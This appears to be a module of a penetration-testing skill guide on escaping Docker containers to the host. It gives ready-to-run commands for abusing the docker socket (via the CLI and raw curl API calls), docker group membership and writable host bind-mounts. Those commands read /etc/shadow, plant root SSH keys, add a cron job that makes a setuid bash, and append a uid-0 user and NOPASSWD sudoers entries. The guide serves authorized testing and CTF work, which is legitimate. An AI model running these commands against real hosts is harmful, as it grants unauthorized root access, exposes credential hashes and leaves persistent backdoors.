# Docker Socket & Host Mount Escapes

**Load when**: `/var/run/docker.sock` is present/writable, the user is in the `docker`
group, or `mount`/`ls -la /` shows host paths bind-mounted into the container.

## 1. Docker socket — with the docker CLI

```bash
ls -la /var/run/docker.sock            # srw-rw---- root docker  => usable if writable/in group
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
# then: read /mnt/etc/shadow, drop an authorized_key, add a cron job, etc.
```

## 2. Docker socket — REST API via curl (no docker CLI in the container)

The socket speaks the Docker HTTP API; `curl --unix-socket` is enough. Create a
container that binds host `/`, start it, and read its output.

```bash
# create
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create \
  -H 'Content-Type: application/json' -d '{
    "Image":"alpine",
    "Cmd":["/bin/sh","-c","cat /mnt/etc/shadow"],
    "HostConfig":{"Binds":["/:/mnt"],"Privileged":true}
  }'
# -> {"Id":"<CID>"}

CID=<CID>
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/$CID/start
# attach stream (or POST /containers/$CID/wait then GET /containers/$CID/logs)
curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$CID/logs?stdout=1&stderr=1" --output -

# For a persistent shell instead of one-shot output, bind / and write to host:
#   Cmd: ["/bin/sh","-c","echo '<pubkey>' >> /mnt/root/.ssh/authorized_keys"]
#   or:  ["chroot","/mnt","sh","-c","<cmd>"]
# If the local image list is empty, POST /images/create?fromImage=alpine&tag=latest first
# (needs egress) or reuse an already-present image: GET /images/json.
```

If only the Docker API over TCP is exposed (2375 plain / 2376 TLS), see the daemon-TCP
notes in the parent `SKILL.md` §2.

## 3. `docker` group membership (no socket path needed to reason about)

Any user in the `docker` group is root-equivalent on the host — the group grants socket
access. Same `run -v /:/mnt` chroot applies. Check with `id`/`getent group docker`.

## 4. Sensitive host bind-mounts

A container that bind-mounts a sensitive host path lets you write host-side files with no
extra capability. Enumerate first:

```bash
mount | grep -iE ' / |/etc|/root|/home|/var/run|proc|sysfs'   # host paths mounted in
cat /proc/self/mountinfo                                       # source (host) side of each mount
ls -la / /host /mnt 2>/dev/null                                # obvious -v /:/host style mounts
```

Escalation depends on which host path is writable:

```bash
# Whole root mounted (-v /:/host): chroot straight in
chroot /host /bin/bash

# /etc writable -> cron root job (path varies: /etc/crontab, /etc/cron.d/*)
echo '* * * * * root cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> /host/etc/cron.d/x

# /root writable -> SSH key
mkdir -p /host/root/.ssh && echo '<your_pubkey>' >> /host/root/.ssh/authorized_keys

# passwd/sudoers writable -> add root user / NOPASSWD
echo 'pwn:$1$abc$<hash>:0:0:root:/root:/bin/bash' >> /host/etc/passwd     # openssl passwd -1
echo 'pwn ALL=(ALL) NOPASSWD:ALL' >> /host/etc/sudoers.d/pwn

# docker.sock bind-mounted in -> see §1/§2
# /proc or /sys writable from host mount -> see capability-escapes.md (core_pattern/modprobe)
```

Prefer the least-destructive write that proves host reach (SSH key, cron reading a flag);
capture evidence (`cat /host/etc/shadow`) rather than clobbering system files.
